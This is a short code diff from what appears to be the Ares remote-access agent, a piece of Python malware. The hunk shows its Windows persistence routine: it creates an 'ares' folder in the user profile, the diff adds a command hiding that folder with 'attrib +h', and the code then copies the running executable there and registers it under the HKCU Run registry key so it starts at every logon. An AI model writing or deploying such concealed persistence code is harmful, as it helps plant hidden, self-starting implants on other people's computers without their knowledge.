@@ -179,7 +179,8 @@ class Agent(object):
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             if not os.path.exists(persist_dir):
-                os.makedirs(persist_dir)
+                os.makedirs(persist_dir)                        # Make folder
+                os.system('attrib +h "{}"'.format(persist_dir)) # Hide folder
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
